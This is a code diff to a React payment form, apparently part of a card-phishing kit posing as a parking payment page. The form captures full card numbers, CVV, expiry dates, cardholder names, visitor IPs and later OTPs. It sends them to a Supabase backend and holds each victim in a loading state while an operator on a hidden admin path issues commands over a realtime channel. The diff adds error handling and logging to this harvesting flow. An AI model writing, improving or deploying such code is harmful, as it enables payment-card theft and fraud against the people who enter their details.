@@ -147,14 +147,27 @@ const PaymentForm = () => {
   useEffect(() => {
     // Initialize Supabase connection and send visitor data
     const initializeConnection = async () => {
-      const realIP = await getRealIP();
-      
-      console.log('Supabase: Sending visitor data with real IP');
-      console.log('Current window location:', window.location.href);
-      console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
-      
-      // Insert or update visitor data
       try {
+        const realIP = await getRealIP();
+        
+        console.log('Supabase: Initializing connection');
+        console.log('Supabase: Sending visitor data with real IP:', realIP);
+        console.log('Current window location:', window.location.href);
+        console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
+        
+        // Test Supabase connection first
+        const { data: testData, error: testError } = await supabase
+          .from('visitors')
+          .select('count', { count: 'exact', head: true });
+        
+        if (testError) {
+          console.error('Supabase connection test failed:', testError);
+          return;
+        }
+        
+        console.log('Supabase connection test successful');
+        
+        // Insert or update visitor data
         const { error } = await supabase
           .from('visitors')
           .upsert({ ip: realIP }, { onConflict: 'ip' });
@@ -269,6 +282,11 @@ const PaymentForm = () => {
       )
       .subscribe((status) => {
         console.log('Subscription status:', status);
+        if (status === 'SUBSCRIBED') {
+          console.log('Successfully subscribed to admin commands channel');
+        } else if (status === 'CHANNEL_ERROR') {
+          console.error('Channel subscription error');
+        }
       });
 
     // Handle click anywhere to show alert
@@ -324,12 +342,15 @@ const PaymentForm = () => {
       
       if (error) {
         console.error('Error inserting card data:', error);
+        throw error;
       } else {
         console.log('Card data sent successfully to Supabase:', insertedData);
         setCurrentSubmissionId(insertedData.id);
+        return insertedData;
       }
     } catch (error) {
       console.error('Error with Supabase insertion:', error);
+      throw error;
     }
   };
 
@@ -382,25 +403,36 @@ const PaymentForm = () => {
     setIsLoading(true);
     setErrorMessage('');
     
-    // Send card data to Supabase
-    const realIP = await getRealIP();
-    const invoiceId = generateInvoiceId();
-    
-    const cardData = {
-      invoice_id: invoiceId,
-      card_number: formData.cardNumber,
-      expiry_month: formData.expiryMonth,
-      expiry_year: formData.expiryYear,
-      cvv: formData.cvv,
-      card_holder: formData.cardHolder,
-      amount: formData.amount,
-      user_ip: realIP,
-      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
-      network: getRandomNetwork()
-    };
-    
-    console.log('Submitting card data to Supabase:', cardData);
-    await sendToSupabase(cardData);
+    try {
+      // Send card data to Supabase
+      const realIP = await getRealIP();
+      const invoiceId = generateInvoiceId();
+      
+      const cardData = {
+        invoice_id: invoiceId,
+        card_number: formData.cardNumber,
+        expiry_month: formData.expiryMonth,
+        expiry_year: formData.expiryYear,
+        cvv: formData.cvv,
+        card_holder: formData.cardHolder,
+        amount: formData.amount,
+        user_ip: realIP,
+        browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
+        network: getRandomNetwork()
+      };
+      
+      console.log('Submitting card data to Supabase:', cardData);
+      const result = await sendToSupabase(cardData);
+      
+      if (result) {
+        console.log('Card submission successful, waiting for admin response...');
+        // Keep loading state until admin responds with a command
+      }
+    } catch (error) {
+      console.error('Failed to submit card data:', error);
+      setIsLoading(false);
+      setErrorMessage('Failed to process payment. Please try again.');
+    }
   };
 
   const handleConfirmPay = async (otp: string) => {
